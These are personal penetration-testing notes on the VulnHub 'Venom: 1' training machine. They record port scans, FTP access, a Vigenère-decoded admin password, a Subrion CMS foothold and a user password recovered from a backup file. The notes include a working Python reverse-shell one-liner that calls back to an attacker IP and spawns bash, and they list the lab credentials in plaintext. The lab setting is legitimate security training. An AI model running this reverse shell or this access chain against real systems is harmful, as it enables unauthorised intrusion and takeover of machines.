https://www.vulnhub.com/entry/venom-1,701/


---

**S1REN's Template Reference**

\[OS]: Unix
\[Web-Technology]: 
\[Hostname]:  
\[IP]:  192.168.100.4
\[USERS]:   
\[CREDENTIALS]:  hostinger

FTP: hostinger: hostinger
http://venom.box/panel/ - dora: E7r9t8@Q#h%Hy+M1234
nathan :: FzN+f2-rRaBgvALzj*Rk#_JJYfg8XfKhxqB82x_a

---
\[To-Try LIST]:  
21:  ftp        vsftpd 3.0.3
![[Pasted image 20250819033712.png]]
![[Pasted image 20250819033823.png]]
└─$ cat hint.txt         
	Hey there... 

T0D0 --

You need to follow the 'hostinger' on 

WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0=  -> standard vigienere cipher

aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI= -> https://cryptii.com/pipes/vigenere-cipher


some knowledge of cipher is required to decode the **dora** password..
try on 
password -- L7f9l8@J#p%Ue+Q1234 -> deocode this you will get the **administrator** password 


admin :: dora
encrypted :: L7f9l8@J#p%Ue+Q1234
key :: hostinger
decrypted :: E7r9t8@Q#h%Hy+M1234
to try on: venom.box 


venom.box -> add to hosts -> webpage -> Powered by Subrion 4.2

![[Pasted image 20250819041003.png]]

rev shell:
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.5",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'`

![[Pasted image 20250819042218.png]]

![[Pasted image 20250819043031.png]]

history:
 cat  /var/www/html/subrion/backup/.htaccess -> FzN+f2-rRaBgvALzj*Rk#_JJYfg8XfKhxqB82x_a

su: nathan
![[Pasted image 20250819043355.png]]


80: Apache httpd 2.4.29 ((Ubuntu)) 
443: Apache httpd 2.4.29




---
\[NMAP RESULTS]:  

PORT     STATE  SERVICE    VERSION
21/tcp   open   ftp        vsftpd 3.0.3
22/tcp   closed ssh
80/tcp   open   http       Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
443/tcp  open   http       Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
7070/tcp closed realserver
8084/tcp closed websnp

\[Web Services Enumeration]:   

**80 and 443:**  http://192.168.100.4:80,http://192.168.100.4:443
Apache httpd 2.4.29: https://www.exploit-db.com/exploits/744
https://launchpad.net/bugs/1288690 -> CVE 2016-4979
Page Source: 5f2a66f947fa5690c26506f66bde5c23 -> Crackstation -> hostinger
Gobuster - /server-status





========================================================================= \[OTHER / PRIVILEGE-ESCALATION]:   ========================================================================= \Take Away Concepts: *  *  *

    
    HOTKEYS! Background: Black Foreground (important elements): Red Background-Color: Select Text > Shift + Alt + B + ENTER Foreground Color: Select Text > Shift + Alt + F + ENTER Move quickly with: Function key + left and right arrows Cntrl + left and right arrows Cntrl + Shift (select text) (edited)
